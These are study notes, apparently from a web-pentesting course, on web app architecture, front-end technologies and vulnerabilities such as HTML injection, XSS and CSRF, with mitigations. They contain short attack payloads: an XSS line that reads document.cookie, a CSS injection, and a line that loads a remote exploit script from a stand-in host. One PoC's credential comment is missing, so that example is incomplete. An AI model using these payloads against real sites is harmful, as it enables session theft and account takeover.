# 09_Intro_to_Web_Applications
# Web Applications: Architecture & Attack Surface

## 1. Introduction & Architecture
Web applications operate on a **client-server architecture**, functioning dynamically within web browsers. 
* **Client-Side (Front-End):** The user interface (UI) executing in the browser (HTML, CSS, JavaScript).
* **Server-Side (Back-End):** The core source code, business logic, and databases hosted on back-end servers.

This decentralized execution allows organizations to deploy powerful, globally accessible applications with real-time control over functionality and design (e.g., Google Workspace, AWS Management Console).

## 2. Web Applications vs. Static Websites
The transition from Web 1.0 to Web 2.0 marked the shift from static delivery to dynamic interaction.
* **Traditional Websites (Web 1.0):** Static content requiring manual hardcoding to update. No real-time backend processing or dynamic user interactions.
* **Web Applications (Web 2.0):** Fully functional, modular applications generating dynamic content based on user input. They are responsive, scalable, and execute without client-side hardware optimization requirements.

## 3. Web Apps vs. Native OS Applications
### Web Applications
* **Pros:** Platform-independent, zero local storage consumption, and **version unity** (centralized patching ensures all users run the same updated version simultaneously).
* **Cons:** Slower execution compared to native apps; restricted by browser capabilities.

### Native OS Applications
* **Pros:** Faster execution, deep OS integration, and direct hardware/local library utilization.
* **Cons:** High maintenance overhead (requires different builds for Windows, macOS, Linux) and decentralized patching.

> **Note:** Modern environments increasingly utilize Hybrid and Progressive Web Applications (PWAs), leveraging modern frameworks to bridge the gap between web portability and native OS performance.

## 4. Distribution Models
Organizations deploy web applications based on specific infrastructure needs:
* **Open-Source (Customizable):** WordPress, Joomla, OpenCart.
* **Closed-Source/Proprietary (SaaS/Subscription):** Shopify, Wix, DotNetNuke.

## 5. Security Risks & Penetration Testing Methodology
Web applications present a massive, globally exposed attack surface. The complexity of modern app stacks increases the likelihood of critical vulnerabilities being deployed into production. A successful breach can result in severe business interruptions and lateral movement into sensitive corporate databases.

### Testing Methodology (OWASP WSTG)
Security assessments must cover both unauthenticated and authenticated perspectives to maximize coverage:
1. **Front-End Triage:** Inspecting HTML, CSS, and JS for client-side vulnerabilities like Cross-Site Scripting (XSS) and Sensitive Data Exposure.
2. **Back-End & Core Logic:** Analyzing browser-to-server HTTP interactions, enumerating backend technologies, and probing for logic flaws and injection points.

## 6. Common Attack Vectors & Real-World Impact
Web apps rarely present immediate, unauthenticated Remote Code Execution (RCE) out of the box. Exploitation typically involves chaining multiple vulnerabilities.

| Vulnerability | Real-World Attack Scenario | Impact |
| :--- | :--- | :--- |
| **SQL Injection (SQLi)** | Extracting usernames/emails from an Active Directory-backed web app to perform **Password Spraying** attacks against corporate portals (VPN, O365). | Unauthorized data access, network foothold, or potential RCE. |
| **File Inclusion (LFI/RFI)** | Reading backend source code to uncover hidden directories, exposing administrative endpoints. | Source code disclosure, potential RCE. |
| **Unrestricted File Upload** | Bypassing client-side filters on a profile picture upload form to upload a reverse shell payload (`.php`, `.aspx`). | Total web server compromise. |
| **Insecure Direct Object Reference (IDOR)** | Tampering with URI parameters (e.g., changing `/user/701/edit` to `/user/702/edit`) combined with broken access control. | Unauthorized access to other users' sensitive data or functionality. |
| **Broken Access Control** | Manipulating POST request parameters during account registration (e.g., intercepting the request and changing `roleid=3` to `roleid=1`). | Privilege escalation, granting rogue administrative access. |

# Web Application Layout & Architecture

## 1. Executive Overview
Web applications are highly diverse in design, programmatic structure, and backend infrastructure. From a SysAdmin and Pentester perspective, understanding the underlying layout is critical for identifying potential attack vectors and ensuring robust deployment.

The web application layout is divided into three core domains:
* **Infrastructure:** The physical or virtual topology required for the application to function (e.g., web servers, database servers).
* **Components:** The individual elements the application interacts with across the UI/UX, Client, and Server boundaries.
* **Architecture:** The logical relationships, communication flows, and dependencies between the various components.

---

## 2. Infrastructure Deployment Models
Web applications rely on various infrastructure setups, commonly referred to as deployment models. The architecture chosen directly impacts scalability, redundancy, and security.

### 2.1. Client-Server Model
The foundational model where a backend server hosts the application and distributes it to accessing clients (browsers).
* **Workflow:** The client accesses the URL -> The browser sends an HTTP request -> The server processes the request (e.g., authentication, database queries) -> The server returns the response to the client for rendering.
* **Execution:** Frontend components are executed client-side (interpreted by the browser), while backend components are compiled/interpreted server-side.

### 2.2. Single Server Architecture
All components (web application, background services, and the database) are hosted on a single machine.
* **Pros:** Straightforward deployment and low maintenance overhead.
* **Cons (Security & Reliability):** Represents a single point of failure (SPOF). This is an "all eggs in one basket" scenario; if the server is compromised or experiences downtime, all hosted applications and data are exposed or rendered inaccessible.

### 2.3. Many Servers - One Database
A segmented model where the database resides on a dedicated server, accessed by one or multiple web servers.
* **Use Case:** Load balancing, primary/backup replication, or shared datasets across multiple related applications.
* **Security Advantage:** Implements **Asset Segmentation**. If a web server is compromised, the attacker does not automatically gain operating system-level access to the database. Similarly, a SQL Injection (SQLi) vulnerability does not immediately compromise the web server's OS. Strict access controls (Least Privilege) are still mandatory.

### 2.4. Many Servers - Many Databases
A highly distributed model where each web application relies on its own dedicated database, often hosted on separate database servers.
* **Use Case:** High Availability (HA) and enterprise redundancy. Often relies on load balancers and automated failover mechanisms.
* **Security Advantage:** Optimal access control and data isolation. An isolated breach is contained within that specific application's environment.

---

## 3. Core Web Application Components
Regardless of the infrastructure model, modern web applications can be broken down into the following core elements:
* **Client** (Web Browser / Mobile App)
* **Web Server** (e.g., Nginx, Apache, IIS)
* **Application Logic** (The backend code processing requests)
* **Database** (e.g., MySQL, PostgreSQL, MongoDB)
* **Services / Microservices**
* **3rd Party Integrations** (APIs)
* **Serverless Functions**

---

## 4. Three-Tier Architecture
Web application components are logically separated into three distinct layers to maintain a clean separation of concerns:

| Layer | Description |
| :--- | :--- |
| **Presentation Layer** | The UI components that enable system interaction. Accessed by the client via the browser and rendered using HTML, CSS, and JavaScript. |
| **Application Layer** | The logical backend where all client web requests are processed. It handles business logic, authorization, privilege validation, and data routing. |
| **Data Layer** | Works in tandem with the Application Layer to store, retrieve, and manage persistent data securely. |

*Note: Certain web servers can also execute OS-level calls and run localized binaries (e.g., IIS ISAPI, PHP-CGI).*

---

## 5. Modern Architectures: Microservices & Serverless

### 5.1. Microservices (Service-Oriented Architecture - SOA)
Microservices decouple core web application tasks into independent, single-purpose components (e.g., Registration, Payments, Search).
* **Characteristics:** Communication between microservices is **stateless** (requests and responses are completely independent). Each service manages its own data structure and can be written in different programming languages.
* **Benefits:** Agility, flexible scaling, rapid CI/CD deployment, reusable code, and high fault tolerance (Resilience).

### 5.2. Serverless Computing
Cloud-native architectures (AWS Lambda, Azure Functions, GCP Cloud Functions) where the cloud provider dynamically manages the allocation and provisioning of servers.
* **Characteristics:** Applications run in stateless computing containers triggered by specific events.
* **Benefits:** Completely removes the SysAdmin overhead of patching, scaling, and maintaining the underlying host OS. 

---

## 6. Architecture Security & Pentesting Implications
During a penetration test, mapping the underlying architecture is just as critical as finding code-level vulnerabilities. Structural design flaws often lead to the most critical compromises.

* **Access Control Flaws:** An application might have secure code, but a broken architectural design regarding Role-Based Access Control (RBAC) could allow Privilege Escalation or Insecure Direct Object References (IDOR). Fixing these requires costly and time-consuming architectural overhauls.
* **Post-Exploitation Awareness:** If a backend server is compromised but the database cannot be located locally, the architecture likely relies on a segregated database server. Proper enumeration is required to map out the segmented network and identify all connected databases. 
* **DevSecOps:** Security must be integrated into every phase of the Software Development Life Cycle (SDLC) to prevent architectural vulnerabilities before deployment.

# Web Application Architecture & Security: Front End vs. Back End

Modern web applications are built on a Full Stack architecture, divided into two distinct environments with different functional boundaries, technologies, and attack surfaces: the Front End (client-side) and the Back End (server-side).

---

## 1. Front End (Client-Side)

The Front End handles everything the user interacts with directly via their web browser. It relies heavily on client-side processing, meaning performance and rendering happen locally on the user's machine.

* **Core Technologies:** HTML (structure), CSS (presentation), and JavaScript (behavior/logic).
* **Key Requirements:** Must be highly optimized, responsive across device form factors (mobile, desktop), and cross-browser compatible.
* **Roles & Tasks:** Visual Concept Design, User Interface (UI), and User Experience (UX) design.
* **Security Perspective:** The client-side is inherently untrusted. Since the source code is rendered locally, it is fully visible and manipulable by the user (or attacker).

## 2. Back End (Server-Side)

The Back End drives the core business logic, processes data, and handles server-to-client communication. It is isolated from direct user interaction.

### 2.1 Core Infrastructure Components

| Component | Description | Technologies / Examples |
| :--- | :--- | :--- |
| **Servers / OS** | The underlying infrastructure hosting the application and its dependencies. | Linux, Windows Server, Docker Containers. |
| **Web Servers** | Software handling incoming HTTP/HTTPS requests and routing traffic. | Apache, Nginx, IIS. |
| **Databases** | Storage systems for retrieving and managing application data. | **Relational:** MySQL, PostgreSQL, Oracle.<br>**Non-Relational:** MongoDB, NoSQL. |
| **Frameworks** | Core environments used to develop and structure the web application logic. | Laravel (PHP), ASP.NET (C#), Spring (Java), Django (Python), Express (Node.js). |

### 2.2 Operational Logic & Containerization
To enforce logical separation and limit the blast radius of potential compromises, backend services are often containerized (e.g., using Docker). This allows the database and the web application to run in isolated environments, securing the infrastructure against lateral movement.

**Core Back End Responsibilities:**
* Developing APIs for Front End communication.
* Managing database queries and state.
* Implementing business logic and integrating third-party cloud services.

---

## 3. Security Posture & Pentesting Methodologies

Web applications are exposed to various attack vectors, primarily through injection vulnerabilities (e.g., SQL Injection, OS Command Injection) where unsanitized user input is processed by the backend.

* **Whitebox Pentesting:** Involves full source code access. Standard for Front End testing (since code is public) or open-source backend applications. Allows for deep static code analysis to uncover hardcoded credentials or logical flaws.
* **Blackbox Pentesting:** Involves testing the application from the outside without source code access. This is the default approach for proprietary Back Ends. 
* *Note:* Vulnerabilities like Local File Inclusion (LFI) can bridge this gap by allowing attackers to read backend source code, effectively pivoting an assessment from Blackbox to Whitebox.

---

## 4. Threat Landscape: Misconfigurations & Vulnerabilities

### Top 20 Web Developer Security Mistakes
As penetration testers, identifying these common architectural and coding flaws is critical during reconnaissance and exploitation phases:

1. Permitting Invalid Data to Enter the Database
2. Focusing on the System as a Whole (Ignoring modular security)
3. Establishing Personally Developed (Custom) Security Methods
4. Treating Security as the Last Step (Lack of DevSecOps)
5. Plain Text Password Storage
6. Creating Weak Passwords
7. Storing Unencrypted Data in the Database
8. Depending Excessively on Client-Side Validation
9. Being Too Optimistic (Assuming secure user behavior)
10. Permitting Variables via the URL Path Name
11. Trusting Third-Party Code / Dependencies
12. Hard-Coding Backdoor Accounts or Credentials
13. Unverified SQL Injections
14. Remote File Inclusions (RFI)
15. Insecure Data Handling
16. Failing to Encrypt Data Properly
17. Not Using a Secure Cryptographic System
18. Ignoring Layer 8 (Human error/social engineering)
19. Failing to Review User Actions (Lack of logging)
20. Web Application Firewall (WAF) Misconfigurations

### OWASP Top 10 Web Application Vulnerabilities
These developer mistakes directly map to the most critical security risks defined by OWASP:

| Rank | Vulnerability |
| :---: | :--- |
| **1** | Broken Access Control |
| **2** | Cryptographic Failures |
| **3** | Injection |
| **4** | Insecure Design |
| **5** | Security Misconfiguration |
| **6** | Vulnerable and Outdated Components |
| **7** | Identification and Authentication Failures |
| **8** | Software and Data Integrity Failures |
| **9** | Security Logging and Monitoring Failures |
| **10** | Server-Side Request Forgery (SSRF) |

# Web Applications: HTML & The DOM

## 1. HTML (HyperText Markup Language) Overview
HTML serves as the foundational skeleton of web applications. It constructs the basic elements of a web page—such as forms, images, titles, and structural containers—which the browser parses and renders to the end-user.

### Basic HTML Structure
Elements are strictly organized in a hierarchical, tree-like structure, heavily resembling XML. The root `<html>` tag encapsulates the entire document.

```html
<!DOCTYPE html>
<html>
    <head>
        <title>Page Title</title>
    </head>
    <body>
        <h1 id="main-heading">A Heading</h1>
        <p class="content-text">A Paragraph</p>
    </body>
</html>
```

**Key Tag Mechanics:**
* Elements rely on opening `<tag>` and closing `</tag>` syntax.
* Attributes like `id` (unique identifier) or `class` (group identifier) are embedded within the opening tag. These attributes are critical injection points when crafting CSS or DOM-based exploits.

## 2. Document Object Model (DOM) Tree
The browser constructs a DOM representation of the HTML document. The W3C defines the DOM as a platform- and language-neutral interface allowing scripts (e.g., JavaScript) to dynamically access and update document content, structure, and style.

```text
document
 └── html
     ├── head
     │   └── title
     └── body
         ├── h1
         └── p
```

**DOM Standards Breakdown:**
* **Core DOM:** Standard model for all document types.
* **XML DOM:** Standard model for XML.
* **HTML DOM:** Standard model specifically for HTML documents.

> **Security Implication:** Understanding the HTML DOM hierarchy (e.g., referencing `document.head` or targeting elements via `getElementById()`) is paramount for identifying injection vectors. Manipulating existing DOM elements or forging new ones is the core methodology behind Cross-Site Scripting (XSS) attacks.

## 3. URL Encoding (Percent-Encoding)
Browsers transmit URLs using the standard ASCII character set. Because HTTP requests cannot process raw special characters or spaces within URLs, unsafe characters must be URL-encoded. This process replaces non-ASCII or unsafe characters with a `%` followed by their two-digit Hexadecimal equivalent.

**Common Encoding Reference:**

| Character | URL Encoded | Description |
| :---: | :---: | :--- |
| `[space]` | `%20` or `+` | Space character |
| `!` | `%21` | Exclamation mark |
| `"` | `%22` | Double quote |
| `#` | `%23` | Hash / Fragment identifier |
| `$` | `%24` | Dollar sign |
| `%` | `%25` | Percent (used for encoding) |
| `&` | `%26` | Ampersand (parameter separator) |
| `'` | `%27` | Single quote |

> **Operational Note:** Proficiency in URL encoding/decoding is a fundamental requirement for IT Security and SysAdmins. It is routinely used to obfuscate payloads, troubleshoot HTTP routing issues, or ensure crafted web requests traverse proxies and WAFs (Web Application Firewalls) cleanly. Burp Suite's native Decoder tab is the industry-standard tool for rapid string conversions during web pentesting.

## 4. Operational Usage & Element Context
Understanding the structural separation within an HTML document is crucial for mapping an application's attack surface:
* `<head>`: Contains metadata not directly rendered on the main canvas (e.g., page title, charset, external dependencies).
* `<body>`: Contains the rendered layout payload (text, media, inputs, forms).
* `<style>`: Embeds internal CSS for styling. 
* `<script>`: Embeds JavaScript logic. *High-value target for code injection and execution.*

# Cascading Style Sheets (CSS)

## Overview
CSS (Cascading Style Sheets) is the foundational stylesheet language used in conjunction with HTML to control the presentation, formatting, and overall visual structure of web pages. As web standards evolve, subsequent iterations of CSS introduce advanced rendering capabilities natively supported by modern browsers.

## Fundamental Mechanics
At its core, CSS targets specific HTML elements (such as tags, classes, or IDs) and defines their styling rules. This architecture allows for centralized design management across an entire web application. 

Common target properties include `font-family`, `background-color`, `text-align`, and spatial dimensions like `margin`, `padding`, and `border`.

### Syntax Structure
CSS rulesets consist of a **selector** followed by a declaration block enclosed in curly braces `{}`. Each declaration pairs a property with a specific value, terminated by a semicolon `;`.

```css
/* Target by HTML Tag */
body {
  background-color: #000000;
}

h1 {
  color: #FFFFFF;
  text-align: center;
}

/* Target by specific ID or Class (crucial for JS DOM manipulation) */
.custom-paragraph {
  font-family: 'Helvetica', sans-serif;
  font-size: 14px;
}
```

## Advanced Capabilities
Beyond static formatting, modern CSS handles complex animations and dynamic spatial rendering (e.g., 3D transformations) without relying heavily on client-side scripting.

* **Animations:** Properties like `@keyframes`, `animation-duration`, and `animation-direction` allow elements to transition smoothly between different states, timelines, and coordinates.
* **Extensibility:** CSS syntax and styling principles are frequently adapted for XML formatting, SVG styling, and designing entire User Interfaces (UI) within modern mobile app development platforms.

## Interoperability with JavaScript
In modern web development, CSS works in tandem with JavaScript. While CSS defines the static and animated visual states, JavaScript is leveraged to execute logic and dynamically manipulate CSS classes or properties in real-time. This synergy is used to react to keystrokes and mouse events, or to generate advanced UI behaviors like Parallax depth effects.

## CSS Frameworks & Preprocessors
Manually writing vanilla CSS for enterprise-scale web applications can be inefficient and difficult to scale. To optimize workflows, ensure cross-browser compatibility, and enforce responsive design standards, developers utilize CSS frameworks and preprocessors. These toolkits provide pre-built, reusable stylesheets and components.

Some of the most widely adopted frameworks in modern environments include:

* **Bootstrap:** The industry-standard UI framework for responsive, mobile-first front-end web development.
* **Sass (Syntactically Awesome Style Sheets):** A powerful CSS extension language (preprocessor) that introduces programming concepts like variables, nested rules, and mixins into CSS.
* **Foundation:** A highly customizable, responsive front-end framework heavily used in enterprise-level applications.
* **Bulma:** A modern, lightweight CSS framework based entirely on Flexbox.
* **Pure:** A minimalist, responsive CSS module suite developed by Yahoo, ideal for lightweight footprint requirements.


# Web Architecture: JavaScript Fundamentals

## Overview
JavaScript (JS) is a core programming language of the web, functioning primarily as a client-side scripting language executed directly within the browser. While HTML structures the content and CSS handles the presentation, JavaScript dictates the behavior, logic, and interactivity of a webpage. 

Although traditionally restricted to the front end, modern implementations like **Node.js** allow JavaScript to function as a robust back-end language, enabling full-stack web application development. Without JS, web pages would remain completely static, lacking interactive elements or real-time state changes.

## Implementation Methods
JavaScript interacts with the web page's source code via the `<script>` tag. There are two primary ways to load JS into the Document Object Model (DOM):

### 1. Inline Execution
Code is embedded directly within the HTML document. While useful for quick scripts, it is generally avoided in production environments in favor of modularity.
```html
<script type="text/javascript">
    // JavaScript logic goes here
</script>
```

### 2. External Sourcing
Code is loaded from an external file. This is the industry standard practice as it improves code maintainability and allows the browser to cache the script.
```html
<script src="./script.js"></script>
```

## DOM Manipulation & Core Functionality
A fundamental use case for JavaScript is interacting with and dynamically modifying HTML elements. 

```javascript
// Targeting an HTML element by its ID and altering its inner text
document.getElementById("button1").innerHTML = "Changed Text!";
```
In a functional web application, this type of execution is typically bound to an event listener, meaning the script triggers only when a specific action occurs (e.g., an end-user clicking the "button1" element).

## Advanced Usage & Asynchronous Operations
Modern web browsers are equipped with highly optimized JavaScript engines that execute code locally on the client-side. This drastically reduces server overhead and allows for rapid processing. Key functionalities include:

* **Dynamic DOM Updates:** Altering the webpage view and content in real-time without requiring a full page reload.
* **Asynchronous Requests (AJAX):** Performing HTTP requests in the background to interact with back-end APIs, sending and retrieving data seamlessly.
* **User Input Processing:** Validating and sanitizing data entered by the user before transmission.
* **Advanced Animations:** Driving complex, interactive visual sequences that surpass the limitations of pure CSS.

## Front-End Frameworks
As enterprise web applications scale in complexity, developing entirely in "vanilla" (pure) JavaScript becomes inefficient. To streamline the development pipeline, the industry relies on JavaScript frameworks and libraries. 

These platforms abstract complex backend-like functionalities (such as routing, state management, and user authentication) into modular components, often dynamically generating HTML rather than relying on static files.

Some of the most prominent front-end frameworks and libraries encountered in modern infrastructure include:
* **React**
* **Angular**
* **Vue**
* **jQuery** *(Considered legacy, but still widely deployed in older environments)*

# Front-End Vulnerabilities: Sensitive Data Exposure

## 1. Overview
While the majority of web application penetration testing targets back-end infrastructure, front-end components present a critical attack surface. Although client-side execution isolates the core back-end from direct exploitation, vulnerabilities here can severely compromise end-users. If an attacker leverages a front-end flaw against an administrative user, it can rapidly escalate to unauthorized backend access, sensitive data leaks, and widespread service disruption.

## 2. Information Gathering & Attack Vectors
**Sensitive Data Exposure** occurs when sensitive information is inadvertently transmitted in clear-text to the client-side environment. This data typically resides in the HTML source code, embedded JavaScript, or external asset links.

### Reconnaissance Techniques
* **Page Source Inspection:** Bypassing UI restrictions (like disabled right-clicks) using `Ctrl + U` or intercepting traffic via web proxies such as **Burp Suite**.
* **Targeting 'Low-Hanging Fruit':**
    * Hardcoded login credentials or cryptographic hashes.
    * Leftover developer comments (e.g., ``).
    * Exposed API endpoints, hidden directories, or debugging parameters.
    * Unintended user data leakage.

## 3. Proof of Concept (PoC)
During an assessment, an apparently secure authentication form might conceal critical flaws within its source code. 

**Target:** Standard Login Form
**Finding:** Hardcoded credentials exposed within HTML comments.

```html
<form action="action_page.php" method="post">
    <div class="container">
        <label for="uname"><b>Username</b></label>
        <input type="text" required>

        <label for="psw"><b>Password</b></label>
        <input type="password" required>

        <button type="submit">Login</button>
    </div>
</form>
```

**Impact:** The failure to sanitize developer comments provides immediate, unauthorized access using the `test:test` credentials. Automated source code analyzers can easily scrape this type of leakage to map hidden functionality or escalate privileges across the web application.

## 4. Remediation & DevSecOps Strategies
To mitigate Sensitive Data Exposure on the client-side, the following practices should be implemented:
* **Code Sanitization:** Ensure production front-end code is rigorously stripped of debugging parameters, test directories, and developer comments.
* **Data Classification:** Strictly classify data types and enforce access controls to determine what is permissible for client-side exposure.
* **Obfuscation & Packing:** Utilize JavaScript minification, packing, and obfuscation techniques to complicate reverse-engineering and deter automated scraping tools.
* **Code Review Pipeline:** Integrate mandatory peer reviews and automated SAST (Static Application Security Testing) tools into the CI/CD pipeline prior to deployment to catch exposed information.

# Frontend Security: HTML Injection & Input Validation

## 1. Overview
Validating and sanitizing accepted user input is a critical component of modern web security. While input validation is traditionally handled on the backend, certain architectures process and render user input entirely on the client side (frontend) without it ever reaching the server. Therefore, implementing robust input sanitization on both layers (Frontend and Backend) is a mandatory security practice.

**HTML Injection** occurs when a web application receives unfiltered user input and dynamically renders it on the page. This vulnerability generally manifests in two primary ways:
* **Stored/Persistent:** Retrieving previously submitted malicious payloads from a backend database (e.g., retrieving an unsanitized user comment).
* **Reflected/DOM-based:** Directly displaying unfiltered input via JavaScript locally on the frontend.

## 2. Security Impact
When an attacker has arbitrary control over how input is rendered, they can inject malicious HTML tags. The browser executes this as part of the Document Object Model (DOM), leading to severe consequences:
* **Credential Harvesting:** Injecting rogue HTML elements, such as external login forms, designed to spoof authentication prompts and siphon user credentials to an attacker-controlled server.
* **Web Page Defacement:** Overwriting the DOM to alter the site's visual appearance, insert unauthorized advertisements, or cause reputational damage to the organization hosting the application.

## 3. Proof of Concept (PoC): DOM-Based HTML Injection

### 3.1. Vulnerable Code Analysis
The following HTML snippet demonstrates a highly vulnerable implementation. The JavaScript function `inputFunction()` captures user input via a `prompt()` dialogue and injects it directly into the DOM using the dangerous `.innerHTML` property without prior sanitization or encoding.

```html
<!DOCTYPE html>
<html>
<body>
    <button onclick="inputFunction()">Click to enter your name</button>
    <p id="output"></p>

    <script>
        function inputFunction() {
            var input = prompt("Please enter your name", "");
            
            // VULNERABILITY: Directly rendering unfiltered input via innerHTML
            if (input != null) {
                document.getElementById("output").innerHTML = "Your name is " + input;
            }
        }
    </script>
</body>
</html>
```

### 3.2. Exploitation Phase
To verify the HTML Injection vulnerability, we can supply a payload designed to alter the DOM's structure. In this scenario, we inject CSS via HTML `<style>` tags to overwrite the `background-image` property of the `body` element.

**Malicious Payload:**
```html
<style> body { background-image: url('https://academy.hackthebox.com/images/logo.svg'); } </style>
```

**Execution & Result:**
Upon submitting the payload through the prompt, the `.innerHTML` property parses the `<style>` tag natively. The browser instantly applies the styling, replacing the page's background with the target external SVG image. 

*Note on Persistence:* Since this specific PoC is DOM-based and executed entirely on the client's frontend session, the injected payload is non-persistent. A simple browser refresh will clear the injected HTML and restore the DOM to its default state.

# Cross-Site Scripting (XSS)

## Overview
HTML Injection vulnerabilities often serve as a stepping stone for Cross-Site Scripting (XSS) attacks. While HTML Injection is limited to rendering rogue markup, XSS escalates the threat by injecting malicious JavaScript code that executes directly on the client side. Achieving arbitrary code execution within the victim's browser can lead to account takeover, session hijacking, or deeper client-side exploitation.

## XSS vs. HTML Injection
Though similar in their execution methodology and reliance on poor input sanitization, the primary distinction lies in the payload. XSS specifically leverages JavaScript to perform advanced client-side attacks, whereas HTML Injection is generally restricted to altering the page's structural or visual integrity.

## Primary Types of XSS

| Type | Description |
| :--- | :--- |
| **Reflected XSS** | Occurs when malicious user input is immediately returned (reflected) by the web application—such as in an error message or search result—without proper sanitization or encoding. |
| **Stored XSS** | Arises when a malicious payload is permanently stored on the target server (e.g., in a database via forum posts or comment sections) and executes whenever victims retrieve the affected data. |
| **DOM-based XSS** | Exploits vulnerabilities within the client-side code rather than the server backend. The payload is written directly to an HTML Document Object Model (DOM) object within the browser (e.g., manipulating the page title or URL parameters). |

## Proof of Concept (PoC): DOM XSS Cookie Stealing
In environments lacking proper input sanitization (similar to basic HTML Injection scenarios), DOM-based XSS can be easily exploited to retrieve sensitive session data. 

### Payload Execution
```javascript
#"><img src=/ onerror=alert(document.cookie)>
```

### Attack Mechanism
1. **Injection:** The payload is injected into a vulnerable input field.
2. **DOM Manipulation:** The browser processes the input, interpreting it as a completely new DOM element.
3. **Execution:** The `onerror` event handler triggers the JavaScript `alert(document.cookie)`, accessing the HTML document tree to retrieve the current session cookie object and displaying it in a pop-up dialog.
4. **Impact:** In a real-world scenario, instead of simply alerting the user, an attacker would replace the `alert` function with a request (e.g., using `fetch()` or `XMLHttpRequest`) to silently exfiltrate the `document.cookie` value to an attacker-controlled server. This enables session hijacking, allowing the attacker to authenticate as the victim without requiring credentials.

# Cross-Site Request Forgery (CSRF)

## 1. Vulnerability Overview
Cross-Site Request Forgery (CSRF) is a client-side vulnerability where an attacker coerces an authenticated user into executing unauthorized actions on a web application. By exploiting the application's trust in the victim's active session, attackers can hijack queries and API calls. CSRF is frequently chained with Cross-Site Scripting (XSS) or manipulates HTTP parameters to seamlessly execute malicious requests on behalf of the victim.

## 2. Exploitation Scenarios

### 2.1. Account Takeover via Password Reset
A classic CSRF vector targets the account management functionality. An attacker crafts a JavaScript payload designed to force a password change to an attacker-controlled value.
* **Execution:** The payload is injected into a vulnerable endpoint (e.g., a stored XSS vulnerability within a comment section).
* **Impact:** When the authenticated victim views the malicious entry, the payload executes automatically in the background, leveraging the active session to change the password. The attacker then logs in, resulting in a full account takeover.

### 2.2. Privilege Escalation Targeting Administrators
Administrators possess highly sensitive privileges that, if compromised, can lead to complete back-end server control. Instead of extracting session cookies (which might be protected by `HttpOnly` flags), attackers can force the admin's browser to execute administrative functions.
* **Payload Delivery:** Rather than embedding the entire script inline, attackers often load remote malicious scripts:
    ```html
    "><script src=//www.example.com/exploit.js></script>
    ```
* **Mechanics:** The `exploit.js` file is custom-built after analyzing the target application's APIs and state-changing procedures. Once triggered by the admin, the script replicates the required HTTP requests to execute privileged actions automatically.

## 3. Prevention & Mitigation Strategies

Robust defense against CSRF and related injection attacks (like XSS) requires a defense-in-depth approach, validating and sanitizing data across both front-end and back-end environments.

### 3.1. Input Handling
While back-end validation is mandatory, applying front-end controls prevents malicious payloads from rendering on the client side even if back-end filters fail.

| Control | Description |
| :--- | :--- |
| **Sanitization** | Stripping or encoding special and non-standard characters from user input before processing, storing, or displaying it (Output Encoding). |
| **Validation** | Verifying that the submitted input strictly matches the expected format, length, and type (e.g., ensuring an email field only accepts a valid email address structure). |

### 3.2. Defense-in-Depth Mechanisms
* **Anti-CSRF Tokens:** Implement unique, unpredictable, and session-specific tokens for every state-changing request. The server must validate this token before processing the transaction.
* **SameSite Cookie Attribute:** Enforce `SameSite=Strict` or `SameSite=Lax` on session cookies to instruct the browser not to send authentication cookies alongside cross-origin requests.
* **Re-Authentication:** Require users to input their current password or complete a multi-factor authentication (MFA) prompt before executing highly sensitive actions (e.g., changing passwords, updating emails).
* **Web Application Firewalls (WAF):** Deploy a WAF to automatically detect and block common injection patterns. *Note: WAFs serve as an additional security layer and should never replace secure coding practices, as their rulesets can often be bypassed.*

> **Security Mindset:** Modern browsers implement built-in protections against automatic JS execution, and frameworks offer native Anti-CSRF mechanisms. However, misconfigurations or chaining vulnerabilities can bypass these safeguards. Applications must be secure by design, treating these mechanisms as complementary layers rather than absolute fixes.

# Web Application Architecture: Back-End Servers

## 1. Overview
A **back-end server** constitutes the underlying hardware and operating system environment hosting the applications required to run a web service. Functioning within the **Data Access Layer**, it acts as the core computational engine, executing all internal processes and transactions that drive the web application ecosystem.

## 2. Software Architecture
The back-end environment typically integrates three primary software components to process client requests and manage data:

1. **Web Server:** Handles HTTP/HTTPS requests and serves content (e.g., Apache, NGINX, IIS).
2. **Database Management System (DBMS):** Stores, retrieves, and manages structured/unstructured data (e.g., MySQL, MS SQL, Oracle).
3. **Development Framework:** The backend logic and application codebase (e.g., PHP, C#, Java, Node.js).

> **Infrastructure Note:** Beyond the core components, modern enterprise back-ends frequently deploy supplementary layers such as **Hypervisors** (for VM management), **Containers** (e.g., Docker for microservices), and **Web Application Firewalls (WAFs)** to harden the security perimeter against Layer 7 attacks.

### 2.1 Common Web Solution Stacks
Back-end components are routinely standardized into specific "stacks" to streamline deployment and ensure compatibility. The most prevalent combinations include:

| Stack | Operating System | Web Server | Database | Language |
| :--- | :--- | :--- | :--- | :--- |
| **LAMP** | Linux | Apache | MySQL | PHP / Python / Perl |
| **WAMP** | Windows | Apache | MySQL | PHP / Python / Perl |
| **WINS** | Windows | IIS | SQL Server | .NET / C# |
| **MAMP** | macOS | Apache | MySQL | PHP / Python / Perl |
| **XAMPP**| Cross-Platform | Apache | MariaDB/MySQL | PHP / Perl |

## 3. Hardware & Infrastructure Scalability
The underlying hardware specifications (CPU, RAM, I/O throughput) directly dictate the application's stability and responsiveness. However, modern infrastructure design moves away from monolithic, single-server deployments to ensure High Availability (HA) and fault tolerance:

* **Load Distribution:** Enterprise web applications distribute incoming traffic across a cluster of back-end servers (using Load Balancers) to optimize resource utilization and prevent bottlenecks.
* **Virtualization & Cloud:** Applications increasingly run on abstracted hardware, utilizing virtual hosts provisioned through data centers or Cloud Service Providers (IaaS/PaaS) rather than relying exclusively on bare-metal servers.
